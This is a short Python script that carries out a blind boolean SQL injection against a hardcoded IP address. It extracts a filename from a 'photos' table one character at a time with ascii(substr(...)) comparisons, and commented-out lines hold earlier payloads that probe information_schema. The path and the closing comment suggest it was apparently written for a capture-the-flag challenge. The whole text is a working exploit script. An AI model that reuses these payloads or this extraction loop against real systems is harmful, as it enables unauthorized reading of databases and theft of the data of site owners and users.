import requests
import string

headers = {
    'Proxy-Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,ja;q=0.6',
}
playload = ''
for num in range(1,65):
    for i in range(48,130):
        #url = '1 and (select 1 from information_schema.columns where table_name="albums" and column_name regexp binary "^i{}")#'.format(playload + i)
        #url = '1 and (select filename from photos where id=3 and filename regexp binary "^{}" limit 0,1)#'.format(playload+i)
        url = '1 and ascii(substr((select filename from photos where id=3),{},1))={}#'.format(num,i)
        params = (
            ('id', url),
        )
        response = requests.get('http://35.196.135.216/65d23523fa/fetch', headers=headers, params=params)
        print(url)
        if(response.status_code == 200):
            playload += chr(i)
            print(playload)
            break
#Kittens